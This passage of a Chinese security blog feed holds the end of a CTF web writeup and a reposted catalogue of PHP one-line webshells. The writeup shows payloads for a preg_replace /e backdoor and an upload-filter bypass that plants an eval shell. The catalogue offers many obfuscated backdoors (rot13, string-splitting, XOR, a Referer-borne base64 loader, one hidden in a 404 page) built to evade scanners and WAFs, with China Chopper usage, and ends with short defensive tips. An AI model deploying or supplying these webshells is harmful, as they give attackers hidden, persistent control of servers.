src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/4.jpg"><p>后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/5.jpg"></p><h1 id="0X03-工控云管理系统设备维护中心被植入后门"><a href="#0X03-工控云管理系统设备维护中心被植入后门" class="headerlink" title="0X03 工控云管理系统设备维护中心被植入后门"></a>0X03 工控云管理系统设备维护中心被植入后门</h1><p><a href="http://111.198.29.45:32548/index.php?page=index" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=index</a><br>看到这url第一反应就是文件包含</p><blockquote><p><a href="http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p></blockquote><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/6.jpg"><p>拿去base64解密<br>关键部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。<br>payload:</p><blockquote><p>pat=/a/e&amp;rep=phpinfo()&amp;sub=a</p></blockquote><p>之后可以通过system()等函数命令执行</p><blockquote><p>pat=/a/e&amp;rep=system(“cat s3chahahaDir/flag/flag.php”)&amp;sub=a</p></blockquote><p>查看源代码getflag<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/7.jpg"></p><h1 id="0X04-工控云管理系统项目管理页面解析漏洞"><a href="#0X04-工控云管理系统项目管理页面解析漏洞" class="headerlink" title="0X04 工控云管理系统项目管理页面解析漏洞"></a>0X04 工控云管理系统项目管理页面解析漏洞</h1><p>题目给了源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">       $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">       $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">       $result = mysql_query($sql);</span><br><span class="line">       $result = mysql_fetch_object($result);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $result = <span class="keyword">False</span>;</span><br><span class="line">       <span class="keyword">die</span>();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">     <span class="keyword">if</span>($result)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">       $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在这一段代码中我们需要绕过<code>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)</code>使<code>$_SESSION[&#39;admin&#39;] = True</code>。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造<code>id=1\09</code>来绕过这部分限制。<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/8.jpg"></p><p>第二部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">      $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">      $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">      $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">          $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">          fwrite($f, $con);</span><br><span class="line">          fclose($f);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这里的<code>$filename = &quot;backup/&quot;.$file;</code>目录为假目录需要绕过。</li><li>正则表达式<code>if(preg_match(&#39;/.+\.ph(p[3457]?|t|tml)$/i&#39;, $filename))</code>对文件后缀进行过滤</li><li>真实的上传目录为uploaded<br>我们可以通过$file加../绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过<code>../cryscat.php/1.php/..</code>绕过。</li></ul><p>payload(post)</p><blockquote><p>con=&lt;?php @eval($_POST[‘cryscat’]);?&gt;&amp;file=../cryscat.php/1.php/..</p></blockquote><p>之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/9.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2019/03/03/赛博地球杯网安大赛web部分Writeup/1.jpg&quot; title=&quot;Hello!&quot;&gt;
&lt;h1 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://www.cryscat.com/tags/Writeup/"/>
    
      <category term="XCTF" scheme="http://www.cryscat.com/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>那些强悍的PHP一句话后门</title>
    <link href="http://www.cryscat.com/2019/01/02/%E9%82%A3%E4%BA%9B%E5%BC%BA%E6%82%8D%E7%9A%84PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8/"/>
    <id>http://www.cryscat.com/2019/01/02/那些强悍的PHP一句话后门/</id>
    <published>2019-01-02T14:58:44.000Z</published>
    <updated>2019-04-09T10:11:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强悍的PHP一句话后门"><a href="#强悍的PHP一句话后门" class="headerlink" title="强悍的PHP一句话后门"></a>强悍的PHP一句话后门</h1><p>这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。</p><h2 id="利用404页面隐藏PHP小马："><a href="#利用404页面隐藏PHP小马：" class="headerlink" title="利用404页面隐藏PHP小马："></a>利用404页面隐藏PHP小马：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@preg_replace(&quot;/[pageerror]/e&quot;,$_POST[&apos;error&apos;],&quot;saft&quot;);</span><br><span class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>404页面是网站常用的文件，一般建好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。</p><h2 id="无特征隐藏PHP一句话："><a href="#无特征隐藏PHP一句话：" class="headerlink" title="无特征隐藏PHP一句话："></a>无特征隐藏PHP一句话：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_POST[<span class="string">'code'</span>] &amp;&amp; $_SESSION[<span class="string">'theCode'</span>] = trim($_POST[<span class="string">'code'</span>]);</span><br><span class="line">$_SESSION[<span class="string">'theCode'</span>]&amp;&amp;preg_replace(<span class="string">'\'a\'eis'</span>,<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'(base64_decode($_SESSION[\'theCode\']))'</span>,<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>将<code>$_POST[&#39;code&#39;]</code>的内容赋值给<code>$_SESSION[&#39;theCode&#39;]</code>，然后执行<code>$_SESSION[&#39;theCode&#39;]</code>，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</p><h2 id="超级隐蔽的PHP后门："><a href="#超级隐蔽的PHP后门：" class="headerlink" title="超级隐蔽的PHP后门："></a>超级隐蔽的PHP后门：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[a]($_GET[b]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>仅用GET函数就构成了木马<br>利用方法：</p><blockquote><p>?a=assert&amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};</p></blockquote><p>执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</p><h2 id="层级请求，编码运行PHP后门："><a href="#层级请求，编码运行PHP后门：" class="headerlink" title="层级请求，编码运行PHP后门："></a>层级请求，编码运行PHP后门：</h2><p>此方法用两个文件实现，文件1<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1.php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">parse_str($_SERVER[<span class="string">'HTTP_REFERER'</span>], $a);</span><br><span class="line"><span class="keyword">if</span>(reset($a) == <span class="string">'10'</span> &amp;&amp; count($a) == <span class="number">9</span>) &#123;</span><br><span class="line">   <span class="keyword">eval</span>(base64_decode(str_replace(<span class="string">" "</span>, <span class="string">"+"</span>, implode(array_slice($a, <span class="number">6</span>)))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>文件2<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//2.php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="comment">//要执行的代码</span></span><br><span class="line">$code = <span class="string">&lt;&lt;&lt;CODE</span></span><br><span class="line"><span class="string">phpinfo();</span></span><br><span class="line"><span class="string">CODE;</span></span><br><span class="line"><span class="comment">//进行base64编码</span></span><br><span class="line">$code = base64_encode($code);</span><br><span class="line"><span class="comment">//构造referer字符串</span></span><br><span class="line">$referer = <span class="string">"a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i="</span>;</span><br><span class="line"><span class="comment">//后门url</span></span><br><span class="line">$url = <span class="string">'http://localhost/test1/1.php'</span>;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    CURLOPT_URL =&gt; $url,</span><br><span class="line">    CURLOPT_HEADER =&gt; <span class="keyword">FALSE</span>,</span><br><span class="line">    CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">TRUE</span>,</span><br><span class="line">    CURLOPT_REFERER =&gt; $referer</span><br><span class="line">);</span><br><span class="line">curl_setopt_array($ch, $options);</span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch);</span><br></pre></td></tr></table></figure></p><p>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。</p><h2 id="PHP后门生成工具weevely"><a href="#PHP后门生成工具weevely" class="headerlink" title="PHP后门生成工具weevely"></a>PHP后门生成工具weevely</h2><p>weevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。</p><p>weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。</p><h2 id="那些强悍的PHP一句话后门"><a href="#那些强悍的PHP一句话后门" class="headerlink" title="那些强悍的PHP一句话后门"></a>那些强悍的PHP一句话后门</h2><p>三个变形的一句话PHP木马<br>第一个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在菜刀里写<a href="http://site/1.php?2=assert密码是1" target="_blank" rel="noopener">http://site/1.php?2=assert密码是1</a></p><p>第二个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=<span class="string">""</span>;</span><br><span class="line">$_[+<span class="string">""</span>]=<span class="string">''</span>;</span><br><span class="line">$_=<span class="string">"$_"</span>.<span class="string">""</span>;</span><br><span class="line">$_=($_[+<span class="string">""</span>]|<span class="string">""</span>).($_[+<span class="string">""</span>]|<span class="string">""</span>).($_[+<span class="string">""</span>]^<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> $&#123;<span class="string">'_'</span>.$_&#125;[<span class="string">'_'</span>]($&#123;<span class="string">'_'</span>.$_&#125;[<span class="string">'__'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在菜刀里写<a href="http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;])" target="_blank" rel="noopener">http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;])</a> 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</p><p>第三个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($b4dboy = $_POST[<span class="string">'b4dboy'</span>]) &amp;&amp; @preg_replace(<span class="string">'/ad/e'</span>,<span class="string">'@'</span>.str_rot13(<span class="string">'riny'</span>).<span class="string">'($b4dboy)'</span>, <span class="string">'add'</span>);</span><br></pre></td></tr></table></figure></p><p>str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！</p><h2 id="最后列几个高级的PHP一句话木马后门："><a href="#最后列几个高级的PHP一句话木马后门：" class="headerlink" title="最后列几个高级的PHP一句话木马后门："></a>最后列几个高级的PHP一句话木马后门：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、</span><br><span class="line">$hh = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</span><br><span class="line">$hh(<span class="string">"/[discuz]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"Access"</span>);</span><br><span class="line"><span class="comment">//菜刀一句话</span></span><br><span class="line"><span class="number">2</span>、</span><br><span class="line">$filename=$_GET[<span class="string">'xbid'</span>];</span><br><span class="line"><span class="keyword">include</span> ($filename);</span><br><span class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行</span></span><br><span class="line"><span class="number">3</span>、</span><br><span class="line">$reg=<span class="string">"c"</span>.<span class="string">"o"</span>.<span class="string">"p"</span>.<span class="string">"y"</span>;</span><br><span class="line">$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);</span><br><span class="line"><span class="comment">//重命名任何文件</span></span><br><span class="line"><span class="number">4</span>、</span><br><span class="line">$gzid = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</span><br><span class="line">$gzid(<span class="string">"/[discuz]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"Access"</span>);</span><br><span class="line"><span class="comment">//菜刀一句话</span></span><br><span class="line"><span class="number">5</span>、<span class="keyword">include</span> ($uid);</span><br><span class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif</span></span><br><span class="line"><span class="comment">//gif插一句话</span></span><br><span class="line"><span class="number">6</span>、典型一句话</span><br><span class="line">程序后门代码</span><br><span class="line"><span class="meta">&lt;?php</span> eval_r($_POST[sb])<span class="meta">?&gt;</span></span><br><span class="line">程序代码</span><br><span class="line"><span class="meta">&lt;?php</span> @eval_r($_POST[sb])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//容错代码</span></span><br><span class="line">程序代码</span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//使用lanker一句话客户端的专家模式执行相关的php语句</span></span><br><span class="line">程序代码</span><br><span class="line"><span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">程序代码</span><br><span class="line"><span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span></span><br><span class="line">程序代码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></span><br><span class="line">程序代码</span><br><span class="line">&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span><br><span class="line">程序代码</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r($_POST[sb])&lt;/script&gt;</span><br><span class="line"><span class="comment">//绕过<span class="meta">&lt;?</span>限制的一句话</span></span><br></pre></td></tr></table></figure><p>综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结!</p><h2 id="如何应对PHP一句话后门："><a href="#如何应对PHP一句话后门：" class="headerlink" title="如何应对PHP一句话后门："></a>如何应对PHP一句话后门：</h2><p>我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：</p><blockquote><p>1.对PHP程序编写要有安全意识<br>2.服务器日志文件要经常看，经常备份<br>3.对每个站点进行严格的权限分配<br>4.对动态文件及目录经常批量安全审查<br>5.学会如何进行手工杀毒《即行为判断查杀》<br>6.时刻关注，或渗入活跃的网络安全营地<br>7.对服务器环境层级化处理，哪怕一个函数也可做规则</p></blockquote><p>我们认为当管理的站点多了，数据量大时，我们应合理应用一些辅助工具，但不应完全依赖这些工具，技术是时刻在更新进步的，最为重要的是你应学会和理解，编写这些强悍后门的人所处思维，角色上的换位可为你带来更大的进步。</p><p>[+]<a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">原文</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;强悍的PHP一句话后门&quot;&gt;&lt;a href=&quot;#强悍的PHP一句话后门&quot; class=&quot;headerlink&quot; title=&quot;强悍的PHP一句话后门&quot;&gt;&lt;/a&gt;强悍的PHP一句话后门&lt;/h1&gt;&lt;p&gt;这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而
      
    
    </summary>
    
    
      <category term="php" scheme="http://www.cryscat.com/tags/php/"/>
    
      <category term="webshell" scheme="http://www.cryscat.com/tags/webshell/"/>
    
  </entry>
  
</feed>
